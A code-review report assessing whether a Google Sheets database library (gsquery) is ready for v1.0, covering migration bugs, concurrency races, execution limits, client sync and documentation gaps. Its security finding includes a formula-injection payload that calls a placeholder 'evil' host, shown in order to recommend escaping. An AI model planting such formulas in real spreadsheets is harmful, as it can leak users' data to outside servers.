# v1.0 Production Readiness Review

- **Baseline**: `dev` @ `28cbffb` (v1.0.0-rc3) — the active development branch. An earlier draft of this review was run against `main`; every finding below was re-verified against `dev`, and findings fixed on `dev` are listed separately at the end.
- **Review axes**: (1) Sheets I/O optimization, (2) concurrency & data integrity, (3) GAS execution-limit resilience, (4) client sync layer, (5) feature completeness, (6) public API / DX.
- **Method**: four parallel deep-review passes over `main`, followed by two adversarial re-verification passes against `dev` re-locating every finding (STILL-PRESENT / PARTIALLY-FIXED / FIXED-ON-DEV / INVALID). All blocker references below point at the `dev`-based tree.

## Verdict

**Not ready for a v1.0 "production" label yet — but `dev` is measurably closer than `main`.** The rc-track fixes (lock-scoped inserts, sync seq boundaries, client-wins retention, init hydration, IDB flush-on-close) resolved 4 of the original 11 blockers outright and narrowed 4 more. However:

- The migration rewrite on `dev` introduced a **new highest-priority defect**: `addColumn` for a genuinely new column is now a silent no-op that still records the migration as applied, and its backfill regressed from ~2 API calls to ~4 calls *per row*.
- The write path is still not concurrency-safe outside auto-mode insert (`update`/`delete`/client-mode `batchInsert`/`migrate` all unlocked).
- `batchUpdate` still writes one `setValues` per row; nothing has chunking or a time budget.
- Formula injection remains unmitigated.
- The `--client` codegen flow still cannot work as shipped.
- The new Docusaurus wiki documents the Viz API that `dev` deleted.

Recommended gate: fix the blockers below (or consciously descope and document), add a Limitations section, then cut v1.0.

## Blockers (verified on dev)

### Migration subsystem (new on dev)

1. **`addColumn` for a new column is a silent no-op that reports success.**
   `packages/core/src/core/migration.ts:310-362`; `packages/core/src/adapters/sheets-adapter.ts:232-252` (`objectToRow` maps only `this.columns`).
   The dev rewrite deleted the physical schema ops (`readHeader`/`insertColumnBefore` are gone from the adapter; `applyOperation` no longer probes `store.addColumn`), leaving `addColumn` as a value backfill over `store.findAll()` + `store.update()`. If the column is not already present in the sheet header and the adapter's `columns` array, `objectToRow` drops the key on write — the sheet is unchanged, yet the migration record is inserted and `getCurrentVersion()` advances. Confirmed empirically. The parity test (`tests/unit/migration-adapter-parity.test.ts:80-86`) hides this by pre-declaring the column.
   *Consequence*: migrations can only backfill pre-existing columns; the version table claims schema changes that never happened; re-running does not repair it.

2. **`addColumn` backfill is one `update()` per row — a massive I/O regression.**
   `packages/core/src/core/migration.ts:321-323`.
   Each `SheetsAdapter.update()` costs ~4 API calls, so a 5,000-row `addColumn` went from ~2 calls (main) to ~20,000 (dev) — deep into 6-minute-kill territory. And when no `default` is supplied, `isEmptyCell` is true for every row on every run, so each execution rewrites all N rows and never converges.
   *Fix direction for 1+2*: restore a physical add-column step (header write + one bulk backfill `setValues`), or require the column pre-declared and fail loudly when absent.

### Core adapter — concurrency (data corruption)

3. **`update()`/`delete()` write to stale row indices entirely outside the lock; client-mode `batchInsert` takes no lock at all.**
   `packages/core/src/adapters/sheets-adapter.ts:424-442` (update), `:444-453` (delete), `:462-466` + `:468-482` (`writeRows` on the `idMode:'client'` path).
   The new `withLock` helper (`:282-295`) correctly covers auto-mode insert/batchInsert, but nothing else. A concurrent `deleteRow` above the target between `findRowIndexById` and the write makes `update` overwrite a *different record* and `delete` remove the wrong row. `update()` is still whole-row read-modify-write (last-writer-wins across fields). Two concurrent client-mode `batchInsert`s still compute the same `getLastRow()+1` start row and clobber each other (hard data loss). `migrate()`/`rollback()` also run with no lock (`migration.ts:368-409`).
   *Fix*: extend `withLock` to update/delete/client-mode batchInsert/migrate; optionally re-verify the ID cell at `rowIndex` before writing.

### Core adapter — I/O and execution limits

4. **`batchUpdate` still writes one `setValues` per updated row.**
   `packages/core/src/adapters/sheets-adapter.ts:544-546` (read is one `getValues` at `:518`; comment at `:543` acknowledges the gap).
   1,000 updated rows ≈ 1,000 write calls; the 6-minute limit kills the run mid-loop around 3,500–8,000 rows, on the method documented as the efficient path.
   *Fix*: single `setValues` over the full data block, or coalesce contiguous dirty rows.

5. **No chunking, checkpointing, or time-budget guard anywhere.**
   `packages/core/src/adapters/sheets-adapter.ts:455-549`, `packages/core/src/core/migration.ts:384-393`; no `retry|backoff|Utilities.sleep` anywhere in core.
   A 6-minute kill mid-batch or mid-migration leaves silent partial state (migration record only lands after all ops).
   *Fix*: chunked writes + a ~5.5-minute deadline guard returning a resume cursor; "started" marker or documented re-run semantics for migrations.

### Core adapter — security

6. **Formula injection: values starting with `=`/`+` are written as live formulas.**
   `packages/core/src/adapters/sheets-adapter.ts:232-252` (`objectToRow`), `:255-275` (`serializeByType`, `default: return value`).
   Verified empirically on dev: `insert({note:'=IMPORTXML("http://evil/","//x")'})` lands in the cell verbatim and executes. Data exfiltration/spoofing vector for any user-supplied field; unmentioned in SECURITY.md.
   *Fix*: escape dangerous leading characters (`=`, `+`, `@`, tab) or force plain-text number format on data ranges.

### Client sync layer

7. **A custom conflict resolver's result is never pushed and is reverted by the next pull; the non-conflicted part of a failed batch is cleared as if applied.**
   `packages/client/src/local/sync-engine.ts:198-228` (custom branch applies via `replaceAll` without recording a mutation; only `client-wins` ids are excluded from `syncedIds` at `:176-185`); `:218` silently drops the resolution if the row was locally deleted.
   The #109/#110 fixes solved the seq race and `client-wins`, but a user-supplied merge function now has exactly the old `client-wins` symptom: resolution exists only in local memory until the next pull erases it. Separately, when a push returns `success:false` with conflicts, the *non-conflicted* mutations in that batch are cleared even though the server never applied them.
   *Fix*: re-enqueue resolver output as a fresh mutation; clear only server-confirmed ids.

8. **One permanently-rejected mutation stalls sync for every table, forever.**
   `packages/client/src/local/sync-engine.ts:108-111` (sequential loop, no per-table try/catch), `:190-195` (`success:false` now throws — loud, but non-isolating), `:271-273`/`:281-283` (debounce/auto-sync swallow).
   A mutation the server always rejects aborts `sync()` before later tables on every attempt: permanent total-sync stall with no retry cap, no backoff, no dead-letter/quarantine.
   *Fix*: per-table isolation, bounded retries with backoff, dead-letter hook.

### CLI

9. **The `--client` codegen flow cannot work as shipped: raw `.ts` written into `node_modules`.**
   `packages/cli/src/commands/generate.ts:183-201`, `:214-229`; `packages/client/package.json` (`exports` declares only `"."`, `files: ["dist"]`, and the package's own `clean` script deletes `generated/`).
   The documented `import ... from '@gsquery/client/generated'` cannot resolve; output is wiped on reinstall; pnpm symlink store pollution.
   *Fix*: generate into the user's project, or ship a declared `./generated` subpath with compiled output.

## Should-fix (verified on dev)

### Core

1. **Single-row ops re-read the entire ID column** (`sheets-adapter.ts:307-319`, `:322-335`) — O(N) API calls per op, O(N²) in loops. Memoize an `id → rowIndex` map + `maxId` alongside `_dataCache`.
2. **`findById` bypasses the warm `_dataCache`** (`:360-367`); `Repository.exists` inherits the cost.
3. **No `batchDelete`** (`types.ts:86-90`, `repository.ts:111-140`) — N deletes cost ~3N calls with a full ID re-read per iteration.
4. **No typed errors or retry for GAS API failures** (`errors.ts:1-116`) — quota/timeout/lock errors surface raw; `withLock` lets `waitLock`'s exception escape untyped; zero backoff.
5. **No guards for 50k-chars-per-cell / 10M-cells limits** (`:232-275`) — oversized `JSON.stringify` output throws mid-batch, leaving partial writes.
6. **`idMode:'client'` never checks ID uniqueness** (`:402-410`, `:468-482`) — a retried request creates an unreachable duplicate row.
7. **`_dataCache` staleness contract undocumented** (`:71-72`, `:128-138`) — no TTL, no opt-out, no doc note about cross-execution snapshots.
8. **`IndexStore` never wired into `SheetsAdapter`; `@unique` enforced by no adapter** (`index-store.ts:17-18` — declared, never read; `IndexStore` contains no `throw`). Production queries are full scans; README/wiki performance claims overstate.
9. **Type-only names exported in value position** (`core/src/index.ts:35,42,43,50`) — confirmed real defect: `dist/types` re-exports them as values while esbuild drops them from `dist/index.mjs`, so `import { SheetsAdapterOptions } from '@gsquery/core'` type-checks then fails at link time under ESM. Mechanical fix: `export type`.
10. **`ValidationError` exported but never thrown** (`errors.ts:92-100`) — no runtime validation exists anywhere; implement or remove.

### Client

11. **Sync protocol still carries no versioning** (`sync-transport.ts:27-32`, `:54`; `mutation-queue.ts:85-90` strips even the new `seq` from `MergedMutation`) — a correct server cannot detect concurrent edits; the `conflicts` mechanism is unimplementable as specified.
12. **Multi-tab remains unsafe** (`mutation-queue.ts:41`, `:213-224` whole-key overwrite; `local-adapter.ts:498-514` IDB clear-and-rewrite). The new `namespace` option (77a1d1c) partitions *instances*, not tabs — and its doc comment (`create-client-db.ts:37-42`) reads as if it solves concurrent access. Document single-tab-only or elect a sync leader (Web Locks/BroadcastChannel).
13. **`openSharedIDB` still has no `onblocked`/`onversionchange`** (`local-adapter.ts:35-87`) — issue #120 confirmed still valid; worse, on a failed shared open each adapter opens its own untracked connection that `close()` never closes (`create-client-db.ts:77-84` + `local-adapter.ts:150-151`), reliably wedging future upgrades. The `probe.onerror` fallback (`:73-85`) is dead code (versionless `open()` creates the DB).
14. **`GasApiTransport` fetch path still ignores GAS web-app realities** (`gas-api-transport.ts:102-129`) — `application/json` POST forces a CORS preflight GAS won't answer; 302→HTML-as-200 undetected (only the parse-error message improved); no timeout. Zero tests.
15. **Cold-start queue rebase missing** (`local-adapter.ts:156-163`) — the `data.length === 0` fast path adopts the IDB snapshot without replaying persisted queue mutations, so a reload that lost a write-behind write shows a stale local view until the next sync (server data is safe; the read view lies).
16. **Silent failure modes remain**: concurrent `sync()` no-ops with no event (`sync-engine.ts:97`); `push()`/`pull()` bypass the `syncing` flag so `isSyncing` lies; empty catches in debounce/auto-sync (`:271-273`, `:281-283`); localStorage persist failure silently degrades to memory-only (`mutation-queue.ts:221-223`).
17. **`ClientDBSchema` and `GeneratedSchema` have diverged and are cross-assignable** (`create-client-db.ts:18-24` has `indexes`, no `columnTypes`; `runtime.ts:46-53` the reverse). Passing the generated schema to `createClientDB` type-checks and silently discards date deserialization — pulled rows are ISO strings typed `Date` (the residual of the datetime fix, which the server path got right via `COLUMN_TYPE_MAP` → `deserializeByType`).
18. **Residual `any` in exported client surface** (`sync-engine.ts:24-25`, `:257`, `:259`; `create-client-db.ts:71-72`, `:94`) — `SyncEngineOptions` is clean now, but `TableBinding`, `replaceAll(... as any[])`, and the `DataStore<any>` records remain.

### CLI / docs / packaging

19. **Schema `indexes:`/`unique:` blocks are parsed then dropped by the generator** (`schema-parser.ts:184-192` vs `client-package-generator.ts:126-146`) — `@unique` on a column does nothing at runtime, undocumented.
20. **Docs drift**: root README still claims `gsquery migrate`/`rollback` execute migrations (preview-only — the new wiki's `cli-reference.md:47-65` gets it right) and still names `gsq.config.json` (actual: `gsquery.config.json`, `init.ts:38`); **the new Docusaurus wiki documents the deleted Viz API** (`website/docs/api-reference.md:287-291`, `architecture-overview.md:59`, `ai-assistant-skills.md:66,79`); the entire local-first client stack (`createClientDB`/`SyncEngine`/`MutationQueue`) is documented nowhere.
21. **Missing "Limitations" documentation**: no transactions, no backup/restore/export, full-table read per query, cache staleness, single-tab constraint, destructive column removal semantics.
22. **Publish gaps**: no per-package README.md/LICENSE in core/client/cli (blank npm pages); `@gsquery/client` declares `main` while ESM-only; root `0.9.0` vs packages `1.0.0-rc3`; cli `peerDependencies: workspace:*` safe only via `pnpm publish`.
23. **CLAUDE.md architecture section is stale** (describes a single-package layout that doesn't exist).

## Later (post-v1.0 acceptable)

- Auto-ID reuse after deleting the max-ID row (`sheets-adapter.ts:302-319`) — persist a counter or recommend UUIDs.
- No cross-execution `CacheService` layer — every execution cold-reads the sheet.
- Server-side filtering (the Viz API was deleted on dev): for 50k+ row sheets an opt-in pushed-down read path remains the real scaling lever, if ever revisited.
- No `SpreadsheetApp.flush()` after critical writes.
- Fresh-checkout `pnpm -r typecheck` fails until core is built.
- `examples/query-builder/index.ts` strict-TS null-check failure.

## Test coverage gaps (why defects survive a green suite)

- **No interleaved-concurrency tests**: the lock test asserts `getScriptLock` was called, not that interleavings are safe; "Concurrent operations" tests run sequentially. Two adapter instances over one shared stub sheet would expose blocker 3 (and would have caught the pre-fix insert race).
- **No write-call-count assertions**: `batchUpdate`'s per-row loop and the migration backfill regression are invisible to value-only assertions; the "large dataset performance" suite runs on `MockAdapter` (CPU, not API budget).
- **Migration parity tests pre-declare new columns**, hiding the addColumn no-op (blocker 1).
- **Zero tests for `gas-api-transport.ts`**; `local-adapter` tests run with IDB disabled — the entire open/upgrade/persist path (issue #120's area) is uncovered; consider `fake-indexeddb`.
- **No failure-injection tests**: quota errors, oversized cells, mid-batch exceptions, `success:false` server responses per table.

## Fixed on dev (main-era findings resolved before this review landed)

- Insert TOCTOU / duplicate IDs: `withLock` now covers auto-mode `insert` and `batchInsert` end-to-end (`sheets-adapter.ts:282-295`, `:414-421`, `:486-498`).
- Mid-push mutation loss: seq boundary captured before the network call; `clearForRows(ids, boundary)` retains newer mutations (#109).
- `client-wins` reverting local edits: conflicted ids excluded from clearing (#110).
- `success:false` without conflicts silently swallowed: now throws (loud, though non-isolating — see blocker 8).
- `init()` clobbering in-memory state and `close()` dropping queued IDB writes (7358342, 9049687).
- Migration backfill idempotency: `isEmptyCell` guard re-applies defaults on rerun (72ffd80) — superseded by the new addColumn design problems (blockers 1–2).
- `QueryBuilder.first()` no longer mutates the builder.
- Viz `like` quote-escaping: moot — the Viz API was removed entirely (public surface freeze, c8f5864).
- `datetime` → `Date` type lie on the server path: `columnTypes` plumbed through to `deserializeByType` returning real `Date`s; relation id types generated correctly (69ea2fa). (Local-first path residual: should-fix 17.)
- Sync/push/pull interleaving data loss: `serialize()` queue added (91d1c54).

## What is done well (dev)

- The `withLock` refactor is exactly the right shape — the remaining work is coverage, not design.
- The seq-boundary fix for the mutation queue is the correct durable-queue pattern, cleanly implemented and tested.
- Read path remains canonical GAS: one bulk `getValues`, memory filtering, consistently invalidated per-execution cache; `batchInsert` is a single `setValues`; JOINs batch-fetch with an `in` query (no N+1).
- The new `@gsquery/core/testing` subpath (GAS fakes, CSV/JSON loaders) is a genuine DX asset and the right foundation for the concurrency/IO tests this review recommends.
- Public surface freeze (c8f5864) shows the right release discipline: dead features (Viz API) were cut rather than shipped half-wired — the remaining gap is that the docs didn't follow.
- Test discipline is real (750+ tests, regression suites per fixed issue) and the id-immutability guards (#98/#113) closed a real class of misuse.
